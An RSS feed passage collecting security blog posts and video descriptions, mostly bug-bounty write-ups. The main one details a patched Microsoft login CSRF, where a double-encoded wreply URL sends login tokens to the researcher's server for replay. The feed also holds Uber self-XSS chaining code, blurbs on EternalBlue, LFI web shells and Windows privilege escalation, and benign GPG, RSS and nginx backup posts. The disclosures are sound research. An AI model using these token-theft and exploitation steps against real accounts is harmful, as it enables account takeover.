        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;pi&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;contentWindow&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerHTML&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;matches&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/value="&lt;/span&gt;&lt;span class="se"&gt;([^&lt;/span&gt;&lt;span class="sr"&gt;"&lt;/span&gt;&lt;span class="se"&gt;]&lt;/span&gt;&lt;span class="sr"&gt;+&lt;/span&gt;&lt;span class="se"&gt;)&lt;/span&gt;&lt;span class="sr"&gt;" name="email"/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;d&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;matches&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;9000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Since our final iframe is loaded from the same origin as the Profile page containing our JS, and &lt;code class="highlighter-rouge"&gt;X-Frame-Options&lt;/code&gt; is set to &lt;code class="highlighter-rouge"&gt;sameorigin&lt;/code&gt; &lt;strong&gt;not&lt;/strong&gt; &lt;code class="highlighter-rouge"&gt;deny&lt;/code&gt;, we can access the content inside of it (using &lt;a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Cross-origin_script_API_access"&gt;&lt;code class="highlighter-rouge"&gt;contentWindow&lt;/code&gt;&lt;/a&gt;)&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/uber-partners-xss/uber-partners-xss-5.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/uber-partners-xss/uber-partners-xss-5.png" style="width: 100%;" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h3 id="putting-it-all-together"&gt;Putting It All Together&lt;/h3&gt;

&lt;p&gt;After combining all the steps, we have the following attack flow:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Add the payload from step 3 to our profile&lt;/li&gt;
  &lt;li&gt;Login to our account, but cancel the callback and make note of the unused &lt;code class="highlighter-rouge"&gt;code&lt;/code&gt; parameter&lt;/li&gt;
  &lt;li&gt;Get the user to visit the file we created from step 2 - this is similar to how you would execute a reflected-XSS against someone&lt;/li&gt;
  &lt;li&gt;The user will then be logged out, and logged into our account&lt;/li&gt;
  &lt;li&gt;The payload from step 3 will be executed&lt;/li&gt;
  &lt;li&gt;In a hidden iframe, they’ll be logged out of &lt;em&gt;our&lt;/em&gt; account&lt;/li&gt;
  &lt;li&gt;In another hidden iframe, they’ll be logged into &lt;em&gt;their&lt;/em&gt; account&lt;/li&gt;
  &lt;li&gt;We now have an iframe, in the same origin containing the user’s session&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This was a fun bug, and proves that it’s worth persevering to show a bug can have a higher impact than originally thought.&lt;/p&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/"&gt;Uber Bug Bounty: Turning Self-XSS into Good-XSS&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on March 22, 2016.&lt;/p&gt;</description><pubDate>Tue, 22 Mar 2016 00:00:00 +0000</pubDate></item><item><title>Obtaining Login Tokens for an Outlook, Office or Azure Account</title><link>https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/</link><description>&lt;p&gt;&lt;em&gt;This is pretty similar to Wes’s &lt;a href="https://www.synack.com/2015/10/08/how-i-hacked-hotmail/"&gt;awesome OAuth CSRF in Live&lt;/a&gt;, except it’s in the main Microsoft authentication system rather than the OAuth approval prompt.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Microsoft, being a huge company, have various services spread across multiple domains (&lt;code&gt;*.outlook.com&lt;/code&gt;, &lt;code&gt;*.live.com&lt;/code&gt;, and so on).&lt;/p&gt;

&lt;p&gt;To handle authentication across these services, requests are made to &lt;a href="https://login.live.com"&gt;login.live.com&lt;/a&gt;, &lt;a href="https://login.microsoftonline.com"&gt;login.microsoftonline.com&lt;/a&gt;, and &lt;a href="https://login.windows.net"&gt;login.windows.net&lt;/a&gt; to get a session for the user.&lt;/p&gt;

&lt;p&gt;The flow for &lt;a href="https://outlook.office.com"&gt;outlook.office.com&lt;/a&gt; is as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User browses to &lt;a href="https://outlook.office.com"&gt;https://outlook.office.com&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;User is redirected to &lt;a href="https://login.microsoftonline.com/login.srf?wa=wsignin1.0&amp;amp;rpsnv=4&amp;amp;wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&amp;amp;id=260563"&gt;https://login.microsoftonline.com/login.srf?wa=wsignin1.0&amp;amp;rpsnv=4&amp;amp;wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&amp;amp;id=260563&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Provided that the user is logged in, a &lt;a href="https://en.wikipedia.org/wiki/POST_(HTTP)"&gt;POST&lt;/a&gt; request is made back to the value of &lt;code&gt;wreply&lt;/code&gt;, with the form field &lt;code&gt;t&lt;/code&gt; containing a login token for the user:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-html"&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;noscript&amp;gt;&lt;/span&gt;JavaScript required to sign in&lt;span class="nt"&gt;&amp;lt;/noscript&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Continue&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text/javascript"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;OnBack&lt;/span&gt;&lt;span class="p"&gt;(){}&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;DoSubmit&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;subt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;subt&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="nx"&gt;subt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;fmHF&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt;&lt;span class="p"&gt;();}}&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;body&lt;/span&gt; &lt;span class="na"&gt;onload=&lt;/span&gt;&lt;span class="s"&gt;"javascript:DoSubmit();"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"fmHF"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"fmHF"&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;"https://outlook.office.com/owa/?wa=wsignin1.0"&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;"post"&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;"_self"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"hidden"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"t"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"t"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"EgABAgMAAAAEgAAAA..."&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;The service then consumes the token, and logs the user in.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since the services are hosted on completely separate domains, and therefore cookies can’t be used, the token is the only value needed to authenticate as a user. This is similar-ish to how OAuth works.&lt;/p&gt;

&lt;p&gt;What this means is that if we can get the above code to POST the value of &lt;code&gt;t&lt;/code&gt; to a server we control, we can impersonate the user.&lt;/p&gt;

&lt;p&gt;As expected, if we try and change the value of &lt;code&gt;wreply&lt;/code&gt; to a non-Microsoft domain, such as &lt;code&gt;example.com&lt;/code&gt;, we receive an error, and the request isn’t processed:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/microsoft/login-3.png"&gt;
        &lt;img src="https://whitton.io/images/microsoft/login-3.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h3 id="fun-with-url-encoding-and-url-parsing"&gt;Fun with URL-Encoding and URL Parsing&lt;/h3&gt;

&lt;p&gt;One fun trick to play around with is &lt;a href="https://en.wikipedia.org/wiki/Percent-encoding"&gt;URL-encoding&lt;/a&gt; parameters multiple times. Occasionally this can be used to bypass different filters, which is the root cause of the bug.&lt;/p&gt;

&lt;p&gt;In this case, &lt;code&gt;wreply&lt;/code&gt; is URL-decoded before the domain is checked. Therefore &lt;code&gt;https%3a%2f%2foutlook.office.com%2f&lt;/code&gt; becomes &lt;code&gt;https://outlook.office.com/&lt;/code&gt;, which is valid, and the request goes through.&lt;/p&gt;

&lt;pre class="highlight"&gt;
&amp;lt;form name="fmHF" id="fmHF" action="&lt;strong&gt;https://outlook.office.com/&lt;/strong&gt;?wa=wsignin1.0" method="post" target="_self"&amp;gt;
&lt;/pre&gt;

&lt;p&gt;What’s interesting is that when passing a value of &lt;code&gt;https%3a%2f%2foutlook.office.com%252f&lt;/code&gt; an error is thrown, since &lt;code&gt;https://outlook.office.com%2f&lt;/code&gt; isn’t a valid URL.&lt;/p&gt;

&lt;p&gt;However, appending &lt;code&gt;@example.com&lt;/code&gt; &lt;em&gt;doesn’t&lt;/em&gt; generate an error. Instead, it gives us the following, which is a valid URL:&lt;/p&gt;

&lt;pre class="highlight"&gt;
&amp;lt;form name="fmHF" id="fmHF" action="&lt;strong&gt;https://outlook.office.com%2f@example.com/&lt;/strong&gt;?wa=wsignin1.0" method="post" target="_self"&amp;gt;
&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;If you’re wondering why this is valid, it’s because the &lt;a href="https://en.wikipedia.org/wiki/Uniform_Resource_Locator#Syntax"&gt;syntax of a URL&lt;/a&gt; is as follows:&lt;/em&gt;&lt;/p&gt;

&lt;pre class="highlight"&gt;
scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]
&lt;/pre&gt;

&lt;p&gt;From this you can tell that the server is doing two checks:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The first is a sanity check on the URL, to ensure it’s valid, which it is, since &lt;code&gt;outlook.office.com%2f&lt;/code&gt; is the username part of the URL.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The second is to determine if the domain is allowed. This second check should fail - &lt;code&gt;example.com&lt;/code&gt; is &lt;strong&gt;not&lt;/strong&gt; allowed.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It’s clear that server is decoding &lt;code&gt;wreply&lt;/code&gt; &lt;em&gt;n&lt;/em&gt; times until there are no longer any encoded characters, and &lt;em&gt;then&lt;/em&gt; validating the domain. This sort of inconsistency is something I’m &lt;a href="https://whitton.io/articles/safecurl-capture-the-bitcoins-post-mortem/#url-parsing-issue-1"&gt;quite familiar with&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now that we can specify an arbitrary URL to POST the token, the rest is trivial. We set the redirect to &lt;code&gt;https%3a%2f%2foutlook.office.com%252f@poc-ssl.fin1te.net%2fmicrosoft%2f%3f&lt;/code&gt;, which results in:&lt;/p&gt;

&lt;pre class="highlight"&gt;
&amp;lt;form name="fmHF" id="fmHF" action="&lt;strong&gt;https://outlook.office.com%2f@poc-ssl.fin1te.net/microsoft/?&lt;/strong&gt;&amp;amp;wa=wsignin1.0" method="post" target="_self"&amp;gt;
&lt;/pre&gt;

&lt;p&gt;This causes the token to be sent to our site:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/microsoft/login-4.png"&gt;
        &lt;img src="https://whitton.io/images/microsoft/login-4.png" /&gt; 
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Then we simply replay the token ourselves:&lt;/p&gt;

&lt;pre class="highlight"&gt;
&amp;lt;form action="https://outlook.office.com/owa/?wa=wsignin1.0" method="post"&amp;gt;
    &amp;lt;input name="t" value="&lt;strong&gt;EgABAgMAAAAEgAAAAwAB...&lt;/strong&gt;"&amp;gt;
    &amp;lt;input type="submit"&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Which then gives us complete access to the user’s account:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/microsoft/login-2.png"&gt;
        &lt;img src="https://whitton.io/images/microsoft/login-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Note: The token is only valid for the service which issued it - an Outlook token can’t be used for Azure, for example. But it’d be simple enough to create multiple hidden iframes, each with the login URL set to a different service, and harvest tokens that way.&lt;/p&gt;

&lt;p&gt;This was quite a fun CSRF to find and exploit. Despite CSRF bugs not having the same credibility as other bugs, when discovered in authentication systems their impact can be pretty large.&lt;/p&gt;

&lt;h2 id="fix"&gt;Fix&lt;/h2&gt;

&lt;p&gt;The hostname in &lt;code&gt;wreply&lt;/code&gt; now must end in &lt;code&gt;%2f&lt;/code&gt;, which gets URL-decoded to &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This ensures that the browser only sends the request to the intended host.&lt;/p&gt;

&lt;h2 id="timeline"&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Sunday, 24th January 2016 - Issue Reported&lt;/li&gt;
  &lt;li&gt;Sunday, 24th January 2016 - Issue Confirmed &amp;amp; Triaged&lt;/li&gt;
  &lt;li&gt;Tuesday, 26th January 2016 - Issue Patched&lt;/li&gt;
&lt;/ul&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/"&gt;Obtaining Login Tokens for an Outlook, Office or Azure Account&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on April 03, 2016.&lt;/p&gt;</description><pubDate>Sat, 02 Apr 2016 23:00:00 +0000</pubDate></item><item><title>bWAPP - HTML Injection - Reflected (GET)</title><link>https://www.youtube.com/watch?v=q4SVMPGASIU</link><description>This is the first in a series on Web site Vulnerabilities using bWAPP.
bWAPP is another purposely buggy website for testing offline. 
This first video is on HTML Injection by reflecting back the response from the page.
We also take the oppotunity to try differnt methods to see what works. 
As I'm nice, I have posted my cheat sheet of numerous different potentials payloads that you can use yourself here https://sql--injection.blogspot.co.uk</description><pubDate>Wed, 08 Mar 2017 14:29:51 +0000</pubDate></item><item><title>New Ethical Hacking with Metasploit Tutorials Site - Udemy site</title><link>https://www.youtube.com/watch?v=qy-to3Praxc</link><description>https://www.udemy.com/interactive-pentesting

I have created a step by step guided tour of using Metasploit from the ground up to help all new comers to understand how to get the most out of this excellent framework.
Alot of the parts that are covered are deem common sense or not worthy of being documented, these i have covered and not assumed you know so you get the most out of it!

https://www.udemy.com/interactive-pentesting</description><pubDate>Tue, 14 Mar 2017 09:23:05 +0000</pubDate></item><item><title>Overview of Fuzzbunch, EternalBlue and DoublePulsar</title><link>https://www.youtube.com/watch?v=AY9YjHy3QS0</link><description>This video shows an overview of exploiting Windows 7 from a Windows XP Box on my personal local LAN. 
I do not condone the use of these tools nor any actions on any person who wishes to uses these tools without the sufficient prior permissions.
It  is my understanding the use of these tools can be used for personal use  but if i find this to be incorrect i shall remove the video for legal purposes.
I have also not included where the files were downloaded from and how the DLL was created, something you can work out for ourselves.</description><pubDate>Sun, 30 Apr 2017 23:54:17 +0000</pubDate></item><item><title>EternalBlue Metasploit Module - No Fuzzbunch Required!</title><link>https://www.youtube.com/watch?v=0iSK85bo65o</link><description>This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again.

Videos shows the module for MS17-010 running against Windows 7 and just for fun crashing an XP machine.</description><pubDate>Sat, 20 May 2017 15:29:42 +0000</pubDate></item><item><title>Metasploitation Live Stream</title><link>https://www.youtube.com/watch?v=M6IMJ51ve4w</link><pubDate>Thu, 25 May 2017 19:35:12 +0000</pubDate></item><item><title>CSRF Example - Low Complexity</title><link>https://www.youtube.com/watch?v=_yjqwGLbOqo</link><description>In this example we very slowly go through how to execute CSRF.

First we are presented with a password reset option.

When viewing the source code we see the form that does not santise any input. 

Now we take this form code and create our own php version of this on our server. Our server needs to be routeable to the vulnerable server.

Now we tell our code that when the a new password is entered and the 'change' option is selected, dont upload '#' upload the path to the csrf form on the vulnerable webpage.
this way we have reset the admin password without the admin knowing about it.
This is a very basic example but the point is still valid.</description><pubDate>Thu, 08 Jun 2017 22:25:52 +0000</pubDate></item><item><title>RCE with Metasploit &amp; LFI/RFI Vulnerbilities</title><link>https://www.youtube.com/watch?v=4vLks6fukyg</link><description>This time we take advantage of a badly configured website with an LFI vulnerability that we can abuse to gain a web-shell as www-data in metasploit.
This requires a very badly configured web-server and therefore this example only works on the security level of 'low' in DVWA.
Useful to know however as an attack vector.</description><pubDate>Sat, 10 Jun 2017 14:53:05 +0000</pubDate></item><item><title>GPG Agent Forwarding</title><link>https://www.grepular.com/GPG_Agent_Forwarding</link><description>&lt;p&gt;I recently discovered that after upgrading my various Debian based devices, I’m now using a version of OpenSSH (&amp;gt;=6.7) which supports GPG Agent Forwarding - &lt;a href="https://wiki.gnupg.org/AgentForwarding"&gt;https://wiki.gnupg.org/AgentForwarding&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In Debian Stretch, systemd is involved with running gpg-agent and sockets are automatically created in /run/user/$UID/gnupg/ where $UID is the uid of the user you’re using. So when I want to forward my gpg-agent to “server.example.com”, I just add the following to my ~/.ssh/config file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host&lt;span class="hljs-built_in"&gt; server &lt;/span&gt;server.example.com
    RemoteForward /run/user/&lt;span class="hljs-variable"&gt;$REMOTE_UID&lt;/span&gt;/gnupg/S.gpg-agent /run/user/&lt;span class="hljs-variable"&gt;$LOCAL_UID&lt;/span&gt;/gnupg/S.gpg-agent.extra
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Replacing $REMOTE_UID with the uid of my user on the remote system, and $LOCAL_UID with the uid of the user on my local system. If you want to figure out your current uid, just run “id -u”.&lt;/p&gt;
&lt;p&gt;The locations of your sockets on the local and remote system will differ according to the distribution you’re using, and as per the wiki if you’re not using Debian Stretch on both sides, you may need to explicitly turn this functionality on in your gpg-agent config.&lt;/p&gt;
&lt;p&gt;You may also need to add “StreamLocalBindUnlink yes” to the /etc/ssh/sshd_config file on the server side as mentioned in &lt;a href="https://wiki.gnupg.org/AgentForwarding"&gt;the wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once done, I can ssh in to “server.example.com” and use the gpg command on that box, without my private keys being installed on that box. In fact, my private keys aren’t installed on my local box either as I use a smart card, but that’s &lt;a href="https://www.grepular.com/blog/"&gt;a different blog post&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.grepular.com/redir?key=amazon_pgp_and_gpg" title="PGP &amp;amp; GPG: Email for the Practical Paranoid"&gt;&lt;img alt="" src="https://www.grepular.com/images/amazon/pgp_and_gpg.jpg" /&gt;&lt;/a&gt;
&lt;a href="https://www.grepular.com/redir?key=amazon_web_application_hackers_handbook" title="The Web Application Hackers Handbook"&gt;&lt;img alt="" src="https://www.grepular.com/images/amazon/web_application_hackers_handbook.jpg" /&gt;&lt;/a&gt;
&lt;a href="https://www.grepular.com/redir?key=amazon_schneier" title="Schneier on Security"&gt;&lt;img alt="" src="https://www.grepular.com/images/amazon/schneier.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;</description><pubDate>Tue, 03 Oct 2017 06:27:06 +0000</pubDate></item><item><title>Twitter to RSS with Google Cloud Function</title><link>https://www.grepular.com/Twitter_to_RSS_with_Google_Cloud_Function</link><description>&lt;p&gt;&lt;strong&gt;2023-Oct-07&lt;/strong&gt; - I noticed this stopped working for me today. Not sure how long it has been broken. I’ve stopped using Twitter myself due to the lunatic leadership and have no interest in investigating why it is broken. See you on &lt;a href="https://mastodon.social/@grepular/"&gt;Mastodon&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;I don’t like having to install additional software to follow people/organisations on Twitter. I already have an RSS client. Why should I have to install a Twitter client too?&lt;/p&gt;
&lt;p&gt;There are services like &lt;a href="https://www.twitrss.me/"&gt;https://www.twitrss.me/&lt;/a&gt; which gate Twitter to RSS,
but they sometimes get ratelimited, as you’re sharing an API with many other
people.&lt;/p&gt;
&lt;p&gt;So I’ve created and released &lt;a href="https://gitlab.com/mikecardwell/functwitter"&gt;funcTwitter&lt;/a&gt; (GPL-3.0). It’s a simple NodeJS application that gates Twitter to RSS. It can be deployed as a &lt;a href="https://cloud.google.com/functions/"&gt;Google Cloud Function&lt;/a&gt;, meaning you don’t need to run any special software on your own host. Google Cloud offers a generous permanent free tier for Cloud Functions, so you can easily do this for free for personal use.&lt;/p&gt;
&lt;p&gt;You need to create a Google Cloud account and a Twitter development account. Details are in the documentation. Once setup, you can just point your RSS feed reader at URLs like:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://YOUR_UNIQUE_CLOUD_FUNCTION_URL?secret=A_RANDOM_SECRET_YOU_CREATED&amp;amp;account=THE_TWITTER_ACCOUNT_TO_FOLLOW"&gt;https://YOUR_UNIQUE_CLOUD_FUNCTION_URL?secret=A_RANDOM_SECRET_YOU_CREATED&amp;amp;account=THE_TWITTER_ACCOUNT_TO_FOLLOW&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The secret is basically an authentication token to prevent anybody else from calling the function.&lt;/p&gt;
&lt;p&gt;You can also follow feeds based on searches by just switching out the “account” query string parameter with a “search” one instead:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://YOUR_UNIQUE_CLOUD_FUNCTION_URL?secret=A_RANDOM_SECRET_YOU_CREATED&amp;amp;search=YOUR_SEARCH_TERM"&gt;https://YOUR_UNIQUE_CLOUD_FUNCTION_URL?secret=A_RANDOM_SECRET_YOU_CREATED&amp;amp;search=YOUR_SEARCH_TERM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.grepular.com/redir?key=amazon_serverless_computing" title="Beginning Serverless Computing"&gt;&lt;img alt="" src="https://www.grepular.com/images/amazon/serverless_computing.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;</description><pubDate>Mon, 24 Dec 2018 13:41:57 +0000</pubDate></item><item><title>Windows 7 Local Privilege Escalation Using Startup Repair</title><link>https://www.youtube.com/watch?v=rIGYNpNIkGY</link><description>In this video, we use the Startup Repair mechanism to open up a notepad, rename the command prompt to impersonate the Accessibility options and pop a command shell with NT AUTHORITY\SYSTEM</description><pubDate>Fri, 21 Jun 2019 09:07:38 +0000</pubDate></item><item><title>Nginx Restic Backend</title><link>https://www.grepular.com/Nginx_Restic_Backend</link><description>&lt;p&gt;I’ve started using an excellent piece of software called &lt;a href="https://restic.net/"&gt;Restic&lt;/a&gt; for backing up my various hosts. Restic has multiple backend types that you can send your backups to. One of the backends it supports is a &lt;a href="https://restic.readthedocs.io/en/latest/100_references.html#rest-backend"&gt;REST API&lt;/a&gt; for which there is an implementation named &lt;a href="https://github.com/restic/rest-server"&gt;Rest Server&lt;/a&gt; written in &lt;a href="https://golang.org/"&gt;Go&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I thought to myself, if it’s just a simple REST API, why do I need to learn/install/manage a new piece of software? I already use &lt;a href="https://nginx.org/"&gt;Nginx&lt;/a&gt; all over the place. Can I just use Nginx for this? The answer was yes.&lt;/p&gt;
&lt;p&gt;I have configured two nginx vhosts, and run them on different ports. One of the vhosts is to be accessed by hosts which are backing themselves up. It doesn’t allow them to delete objects (other than lock files), or overwrite them either. Meaning it is an “append-only” backup solution. The other vhost allows deletion, and exists for administrative tasks like pruning old backups.&lt;/p&gt;
&lt;p&gt;For demo purposes, I’ve stripped a few things out of this config, e.g TLS. You will need to modify the config for your own use cases. Here is the the append-only config:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {

    listen &lt;span class="hljs-number"&gt;0.0&lt;/span&gt;.&lt;span class="hljs-number"&gt;0.0&lt;/span&gt;:&lt;span class="hljs-number"&gt;80&lt;/span&gt;;

    &lt;span class="hljs-comment"&gt;# In my testing, all objects are much smaller than 1GB in size, even if the file is larger. This may be tunable.&lt;/span&gt;
    client_max_body_size &lt;span class="hljs-number"&gt;1000&lt;/span&gt;M;

    &lt;span class="hljs-comment"&gt;# We support Restic REST API v2, only&lt;/span&gt;
    default_type &lt;span class="hljs-string"&gt;"application/vnd.x.restic.rest.v2"&lt;/span&gt;;

    &lt;span class="hljs-comment"&gt;# Authentication&lt;/span&gt;
    auth_basic           &lt;span class="hljs-string"&gt;"Restic Append-Only Backups"&lt;/span&gt;;
    auth_basic_user_file /opt/backups/auth/.htpasswd;
    root                 /opt/backups/repo/&lt;span class="hljs-variable"&gt;$remote_user&lt;/span&gt;;

    &lt;span class="hljs-comment"&gt;# Routing&lt;/span&gt;
    error_page &lt;span class="hljs-number"&gt;470&lt;/span&gt; = @list_objects;
    error_page &lt;span class="hljs-number"&gt;471&lt;/span&gt; = @read_object;
    error_page &lt;span class="hljs-number"&gt;472&lt;/span&gt; = @write_object;
    error_page &lt;span class="hljs-number"&gt;473&lt;/span&gt; = @delete_object;
    error_page &lt;span class="hljs-number"&gt;474&lt;/span&gt; = @put_proxy;

    &lt;span class="hljs-comment"&gt;# Things that can be listed&lt;/span&gt;
